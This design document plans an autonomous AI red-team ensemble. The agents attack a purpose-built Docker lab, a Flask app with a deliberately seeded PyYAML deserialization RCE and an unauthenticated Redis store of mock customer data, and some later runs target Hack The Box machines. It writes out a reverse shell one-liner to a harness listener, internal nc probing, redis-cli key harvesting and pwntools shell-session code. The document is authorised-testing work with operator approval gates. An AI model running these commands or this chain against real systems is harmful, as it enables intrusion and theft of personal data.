# Red Team System Test

Design notes for the **red-teaming ensemble** — the first authentic engagement ensemble for Athena.
Companion to `ENSEMBLES.md` (harness spec), `BRIEFING.md` (operator control surface), and
`ENSEMBLE_UI.md` (UI rework).

Status: **design / discussion.** Nothing here is built yet.

---

## 1. Purpose

Validate the ensemble harness against a realistic red team engagement. Three goals:

1. **Technical credibility** — the engagement must be indistinguishable in method from human
   red team work, mapped to MITRE ATT&CK throughout. The audience is an experienced red team director.
2. **Operator interaction showcase** — the demo must demonstrate agent-operator collaboration:
   gate approvals, mid-run chat, committee `ask_operator`, and pivot approval.
3. **Autonomy** — committees drive the engagement from a high-level goal ("get the crown jewels"),
   not a hardcoded script. The orchestrator is given a target and constraints; the committees
   determine the path.

The old red-team workflow (`src/athena/`, hardcoded Python committees) is considered invalid as a
reference — methodology and committee names may be reused; the implementation is not.

---

## 2. Target Design

### 2.1 Company profile

**[TARGET COMPANY]** — fictional mid-size B2B software company. *(Name TBD — see Open Decisions.)*

The company has:
- A public-facing web application (Flask, Python 3.10)
- A public GitHub org with source repositories (intentionally discoverable via OSINT)
- An employee email domain with names discoverable from the company website
- A historical data breach: one credential for an employee email in the mocked breach database

**Crown jewels**: customer PII in an internal Redis data store — names, emails, shipping
addresses, approximately 50,000 records.

### 2.2 Docker Compose topology

```
                                  ┌──────────────────────┐
                                  │  web-app:5000        │
[ harness ] ──HTTP exploit──────► │  (Flask, PyYAML RCE) │
            ◄──reverse shell───── │                      │
                                  └──────────┬───────────┘
                                             │ internal network
                                             ▼
                                  ┌──────────────────────┐
                                  │  redis:6379          │
                                  │  (no auth, PII data) │
                                  └──────────────────────┘
```

Three containers:

| Container | Exposed to harness | Role |
|-----------|-------------------|------|
| `harness` | — | Athena runner; reverse shell listener on port 4444 |
| `web-app` | Port 5000 (HTTP) | Flask app; vulnerable to PyYAML deserialization; can reach `redis` |
| `redis` | **No** — internal network only | Unauthenticated Redis; holds crown jewels |

The harness can reach `web-app` (public-facing DMZ) but **cannot reach `redis`** directly.
The reverse shell from `web-app` back to `harness` is what enables internal discovery and the pivot.

### 2.3 Vulnerabilities seeded

**web-app**:
- `requirements.txt` pins `pyyaml==3.13` (CVE-2017-18342) — discoverable via GitHub OSINT
- `/api/parse-config` endpoint calls `yaml.load(user_input)` without `Loader` → RCE
- Company website has a "Stack" or "Careers" page confirming Python + PyYAML in the tech stack
- One employee email in the local breach database (credential does **not** work on prod — SSO
  enforced; staging credential, already rotated)

**redis**:
- No `requirepass` set
- `customer:<id>` keys — JSON PII records (name, email, address)
- `session:<token>` keys — bonus finding: active session tokens (discovered opportunistically)

---

## 3. Attack Chain

Full kill chain with MITRE ATT&CK technique IDs. The committees discover this path autonomously
from the engagement brief — it is not hardcoded into their playbooks.

```
── Recon Committee ──────────────────────────────────────────────────────────

  T1591.002  Gather Victim Org Info: Business Relationships
             OSINT scrape of company website → tech stack, employee names, email domain

  T1213.003  Data from Information Repositories: Code Repositories
             GitHub org enumeration → requirements.txt → pyyaml==3.13 identified

  T1596.005  Search Open Technical Databases
             Cert transparency (crt.sh mock) → subdomains enumerated

  T1589.002  Gather Victim Identity Info: Email Addresses
             Breach DB lookup → 1 credential for @[target].com found in dump

             ↓ Foundation-Sec synthesises surface assessment + CVE-2017-18342 identification

── Planning Committee ───────────────────────────────────────────────────────

  (3 consensus candidates; leader selects best attack vector priority)

  Ordered plan:
  1. Test harvested credential on /login → EXPECTED: fail (SSO on prod)
  2. PyYAML deserialization RCE on /api/parse-config (PRIMARY — CVE-2017-18342)
  3. Enumerate /static/ and /api/ surface for additional findings

             ↓ OPERATOR APPROVAL GATE (hardcoded — not a toggle)

── Exploitation Committee ───────────────────────────────────────────────────

  T1078      Valid Accounts
             Credential test against /login → FAIL (SSO redirect, creds stale)

  T1190      Exploit Public-Facing Application
             POST /api/parse-config with PyYAML !!python/object/apply payload → RCE confirmed

  T1059.004  Command and Scripting Interpreter: Unix Shell
             Reverse shell payload delivered → bash -i >& /dev/tcp/harness/4444 0>&1
             harness:4444 receives connection — shell on web-app established

  T1505.001  Server Software Component: Web Shell  (optional — if persistence step added)

  T1046      Network Service Discovery
             From shell: nc -zv redis 6379 → port open, banner confirms Redis, no auth

             ↓ LEADER ask_operator: "Discovered unauthenticated Redis at redis:6379 with
               what appear to be customer records. This is outside the original scope.
               Approve pivot and data harvest?"

             ↓ OPERATOR APPROVES

  T1021      Remote Services (lateral movement)
             redis-cli -h redis KEYS '*' → customer:* (50k), session:* (active tokens)

  T1005      Data from Local System
             redis-cli GET customer:1 ... → PII confirmed. Harvest complete.

── Reporting Committee ──────────────────────────────────────────────────────

  Foundation-Sec maps full kill chain to ATT&CK; assesses severity; proposes remediation.
  Report: executive summary + technical findings + kill chain diagram + remediation.
```

---

## 4. Ensemble Structure

### 4.1 Overview

Four committees, linear workflow with a single hardcoded gate:

```
recon ──► planning ──[operator_approval]──► exploitation ──► reporting
```

Self-loop `retry` and `iterate` declared on each committee. No cross-committee back-edges
in this first version. All switches OFF — the planning gate is the only gate that fires by default.

### 4.2 Recon Committee

**Goal**: passive intelligence gathering — no packets sent to the target network.

| Element | Model | Mode | Role |
|---------|-------|------|------|
| `web_osint` | claude-sonnet-4-6 | tool-using | Scrapes company website + GitHub org; extracts tech stack, employee names, email domain, pinned dependencies |
| `cert_transparency` | claude-haiku-4-5 | tool-using | Queries crt.sh mock for target domain; enumerates subdomains |
| `breach_lookup` | claude-haiku-4-5 | tool-using | Queries local SQLite breach DB; returns credentials matching target email domain |
| `threat_analyst` | Foundation-Sec | reasoning-only | Receives all prior elements' outputs; produces ATT&CK technique hypotheses, CVE candidates, attack surface summary |

`threat_analyst` is always the last element in any Recon step — it synthesises the other elements' outputs.

**Skills used**: `http_get`, `breach_db_query` (new)

**Output** (`ReconArtifact`): discovered assets, tech stack, credential candidates, Foundation-Sec surface assessment with ATT&CK technique IDs and CVE-2017-18342 flagged.

### 4.3 Planning Committee

**Goal**: prioritise attack vectors from ReconArtifact; produce an ordered, ATT&CK-mapped attack plan.

| Element | Model | Mode | Instances |
|---------|-------|------|-----------|
| `exploit_planner` | claude-haiku-4-5 | reasoning-only | 3 (consensus) |

Judge: `leader` — selects best of 3 candidates. Adequacy criterion: specificity of exploit path,
accuracy of ATT&CK mapping, and feasibility given the engagement constraints.

**Skills used**: none (reasoning-only consensus)

**Output** (`PlanArtifact`): ordered attack vectors, each with target endpoint, technique ID,
CVE reference if applicable, success criteria, fallback.

**Gate**: `operator_approval` — operator reviews and approves the plan before any traffic
reaches the target network. This is the primary showcase moment on the BRIEFING.md panel.

### 4.4 Exploitation Committee

**Goal**: execute the attack plan; achieve access to crown jewels.

| Element | Model | Mode | Role |
|---------|-------|------|------|
| `web_exploiter` | claude-sonnet-4-6 | tool-using | HTTP skill calls — credential test, PyYAML payload delivery, endpoint enumeration |
| `shell_operator` | claude-sonnet-4-6 | tool-using | Operates the reverse shell session — network discovery, internal probing, redis-cli harvest. Active only after `get_shell` succeeds. |

**Skills used**: `http_get`, `http_post` (new), `get_shell` (new), `run_cmd` (new), `close_shell` (new)

**Operator interaction**: after `shell_operator` discovers Redis via `nc` probe, the leader
calls `ask_operator`: *"We have code execution on web-app. Internal scan reveals Redis at
redis:6379 (unauthenticated) with what appear to be customer records. This is outside the
original scope. Approve pivot and data harvest?"* Pipeline pauses; operator replies via chat.

**Output** (`ExploitArtifact`): per-vector result (succeeded / failed / partial), shell
session details, data harvested (counts, sample), ATT&CK techniques confirmed.

### 4.5 Reporting Committee

**Goal**: produce a formal red team report suitable for a client security team.

| Element | Model | Mode | Role |
|---------|-------|------|------|
| `findings_analyst` | Foundation-Sec | reasoning-only | Maps ExploitArtifact to full ATT&CK kill chain; assesses risk; proposes remediation |
| `report_writer` | claude-haiku-4-5 | reasoning-only | Formats structured findings into report sections |

**Skills used**: none (reasoning-only)

**Output** (`ReportArtifact`): executive summary, technical findings with ATT&CK technique IDs
and CVE references, severity ratings (CVSS where applicable), remediation recommendations.

---

## 5. Skills Required

| Skill | Status | Notes |
|-------|--------|-------|
| `http_get` | ✅ exists | May need configurable User-Agent for OSINT scraping |
| `http_post(url, headers, body)` | 🔧 new | POST with custom headers + body; returns status + response text |
| `breach_db_query(domain)` | 🔧 new | Queries local SQLite breach DB; returns matching credentials |
| `get_shell(lhost, lport, payload_cmd)` | 🔧 new | Starts pwntools listener, calls payload delivery hook, waits for callback; returns `session_id` |
| `run_cmd(session_id, cmd)` | 🔧 new | Sends command to open shell session; reads until sentinel; returns stdout |
| `close_shell(session_id)` | 🔧 new | Tears down pwntools connection; removes from registry |

**New Python dependency**: `pwntools` in the harness container (`requirements.txt`).

**Session registry**: `_active_shells: dict[str, Connection]` in a new `skills/shell.py` module.
Persists across skill calls within the same committee run. Cleared on engagement teardown.

---

## 6. Reverse Shell Mechanic

An HTTP relay (harness POSTs commands to a relay endpoint on the target) was considered and
rejected for this demo. The correct connection model for an experienced audience is the reverse
shell: the target calls *out* to the attacker, simulating the real case where the target network
blocks inbound connections but allows outbound. An HTTP relay is immediately recognisable as fake.

### Flow

1. `get_shell` starts a pwntools listener on `harness:4444` (before payload fires)
2. `web_exploiter` POSTs the PyYAML payload to `/api/parse-config` — the deserialized object
   calls `subprocess.Popen` with:
   ```
   bash -i >& /dev/tcp/harness/4444 0>&1
   ```
3. `get_shell` receives the incoming connection; registers it as `session_id → Connection`
4. `shell_operator` calls `run_cmd(session_id, cmd)` for each command in its task

### Output delimiting

No TTY means no shell prompt to read until. Each `run_cmd` appends `; echo __DONE__<uuid>` to
the command. `pwntools` `recvuntil(b"__DONE__<uuid>")` cleanly terminates the read. A
call-scoped UUID prevents false matches on command output that contains the sentinel string.

### Docker networking

All containers share the default Docker Compose bridge network. `web-app` can reach `harness`
by service name. The payload `bash -i >& /dev/tcp/harness/4444 0>&1` resolves correctly.
No additional Docker networking configuration required.

### Implementation sketch

```python
# skills/shell.py
from pwn import listen
from athena.utils import new_id

_active_shells: dict[str, any] = {}

def get_shell(lhost: str, lport: int, timeout: int = 30) -> str:
    conn = listen(lport, timeout=timeout)
    conn.wait_for_connection()
    session_id = new_id()
    _active_shells[session_id] = conn
    return session_id

def run_cmd(session_id: str, cmd: str, timeout: int = 15) -> str:
    conn = _active_shells[session_id]
    sentinel = f"__DONE__{new_id()}"
    conn.sendline(f"{cmd}; echo {sentinel}".encode())
    return conn.recvuntil(sentinel.encode(), timeout=timeout).decode()

def close_shell(session_id: str) -> None:
    conn = _active_shells.pop(session_id, None)
    if conn:
        conn.close()
```

### Failure handling

| Failure | Handling |
|---------|----------|
| No callback within timeout | `get_shell` raises; leader receives error output; may retry step or `ask_operator` |
| Shell dies mid-committee | `run_cmd` catches socket error; returns error string to leader; leader decides to `finish(incomplete=True)` or `ask_operator` |
| Stale session on restart | Session registry cleared on engagement start; `close_shell` called at committee teardown |

---

## 7. Operator Interaction Points

These are the moments that showcase the agent-operator interaction model to the demo audience.

| # | Moment | Mechanism | What the operator sees |
|---|--------|-----------|----------------------|
| 1 | Briefing | `orchestrator.ask_user` | "What is the target company, scope, and any constraints?" |
| 2 | Plan ready | `engagement.plan_ready` | Ordered attack vectors; Proceed / Request changes buttons |
| 3 | After Planning | `gate.awaiting_approval` | "Attack plan ready. Approve before exploit traffic begins." |
| 4 | Redis discovered | `committee.ask_operator` | "Unauthenticated Redis found internally. Approve pivot?" |
| 5 | After Exploitation | `gate.decision` | Orchestrator advances or proposes iterate if harvest was partial |

**Moment 4 is the showcase centrepiece**: the committee leader pauses mid-committee, the graph
freezes on the Exploitation node, and the operator gets a specific, consequential question with
enough context to make a real decision. The operator's reply routes back to the leader, which
continues. This is the interaction model that distinguishes Athena from a batch script.

### Switches (per BRIEFING.md)

All OFF by default. The planning gate (#3 above) is hardcoded in the manifest
(`operator_approval` after `planning`) — it is not controlled by a toggle. The BRIEFING.md
switch panel can add additional gates during briefing if the operator wants them.

---

## 8. Model Allocation

| Role | Model | Reason |
|------|-------|--------|
| All committee leaders | claude-sonnet-4-6 | Multi-doc context, reliable tool calling, gate reasoning |
| `threat_analyst`, `findings_analyst` | Foundation-Sec (Modal) | ATT&CK taxonomy, CVE knowledge; reasoning-only (cannot call tools) |
| `exploit_planner` (3× consensus) | claude-haiku-4-5 | Narrow reasoning task; 3× multiplier makes cost matter |
| `web_exploiter`, `shell_operator` | claude-sonnet-4-6 | Reliable structured tool use; exploit reasoning |
| `web_osint`, `cert_transparency`, `breach_lookup`, `report_writer` | claude-haiku-4-5 | Focused single-purpose tasks |

Foundation-Sec: live on Modal, callable via `OllamaBackend` (OpenAI-compat endpoint).
Confirmed available for the demo environment.

---

## 9. MITRE ATT&CK Coverage

| Tactic | Technique | Committee | Status |
|--------|-----------|-----------|--------|
| Reconnaissance | T1591.002 Business Relationships | Recon | Passive — website OSINT |
| Reconnaissance | T1213.003 Code Repositories | Recon | GitHub org → requirements.txt |
| Reconnaissance | T1596.005 Open Technical Databases | Recon | Cert transparency |
| Reconnaissance | T1589.002 Email Addresses | Recon | Breach DB lookup |
| Initial Access | T1078 Valid Accounts | Exploitation | Attempted, fails (SSO) |
| Initial Access | T1190 Exploit Public-Facing App | Exploitation | PyYAML RCE succeeds |
| Execution | T1059.004 Unix Shell | Exploitation | Reverse shell |
| Discovery | T1046 Network Service Discovery | Exploitation | Internal nc probe → Redis |
| Lateral Movement | T1021 Remote Services | Exploitation | redis-cli from web-app shell |
| Collection | T1005 Data from Local System | Exploitation | customer:* key harvest |

Foundation-Sec is responsible for this mapping at both ends: Recon (hypothesis) and
Reporting (confirmation). The kill chain flows from technique hypotheses in `ReconArtifact`
to confirmed techniques in `ReportArtifact`.

---

## 10. Open Decisions

- [ ] **Target company name** — placeholder: `[TARGET COMPANY]`. Needed before `capability.md`
      can be written. Suggestion: *"Meridian Systems."*

- [ ] **Breach credential fate** — current design: credential fails on prod (SSO enforced;
      staging credential, already rotated). This simplifies the exploitation path but loses
      a T1078 success. Alternative: credential succeeds on a `/staging` subdomain,
      giving a second initial-access vector and a more complex path for the committee to
      reason about. Decision affects `PlanArtifact` design.

- [ ] **OSINT tooling** — since the company is fictional, real crt.sh returns nothing.
      All OSINT is local/mocked: a company website Docker container + local breach SQLite.
      Confirm this is acceptable, or decide whether the demo uses a real domain with
      real crt.sh results alongside a mocked breach DB.

- [ ] **Persistence step** — adding T1505.001 (web shell dropped to disk on web-app after
      RCE) before the reverse shell adds one technique and makes the kill chain more complete,
      at the cost of one more step in the exploitation committee. Low complexity; good
      ATT&CK coverage improvement.

---

## 11. Hack The Box — Proof-of-Capability Badge

The demo itself uses the Docker Compose environment above. HTB is **not** the demo target.

HTB is used separately to produce a solved-box badge or screenshot that can be referenced
during the demo as proof that the same ensemble works against real, unknown machines — not
just a purpose-built lab. This de-risks the live demo (no live exploit against an unknown
machine) while retaining the credibility claim ("we've already solved X box with this").

### Access model

HTB machines sit on a private VPN subnet (`10.10.11.x` / `10.129.x.x`). The harness machine
connects via OpenVPN (`.ovpn` config from HTB dashboard), which brings up a `tun0` interface.
From that point Athena has direct TCP access to the target — no relay, no proxy. Reverse shell
callbacks use the `tun0` IP as `LHOST`.

### Committee structure differs from Docker ensemble

HTB machines have no company website, so the committee structure flips to network-first:

| Committee | HTB variant |
|-----------|-------------|
| Recon | `nmap_scan` + `http_probe` + `ffuf_scan` (directory enum) + `searchsploit` (CVE lookup) |
| Planning | Same consensus model, reasoning from discovered services/versions |
| Exploitation | Exploit delivery + reverse shell + privilege escalation |
| Post-exploitation | `linux_enum` (linpeas wrapper) + flag harvest (`user.txt`, `root.txt`) |

### Machine selection criteria

- **Retired box** (writeup available — validate ensemble succeeds before recording)
- **Web-based initial foothold** — SSTI, LFI, deserialization, or CVE against a known service;
  agents reason about these better than binary exploitation
- **One clear privesc path** — sudo misconfiguration, SUID, cron, or token; keeps post-exploit
  committee shallow
- **No kernel exploits** — LLM-directed kernel payloads are fragile
- Difficulty: Medium Linux

### Additional skills needed (HTB only)

| Skill | Notes |
|-------|-------|
| `nmap_scan(target, flags)` | Port / service / version discovery |
| `ffuf_scan(url, wordlist)` | Directory and vhost bruteforce |
| `searchsploit(service, version)` | Local ExploitDB CVE lookup |
| `linux_enum(session_id)` | Stripped linpeas/linenum; returns priv-esc candidates |
| `read_file(session_id, path)` | Flag file retrieval |

`get_shell`, `run_cmd`, `close_shell` are shared with the Docker ensemble unchanged.
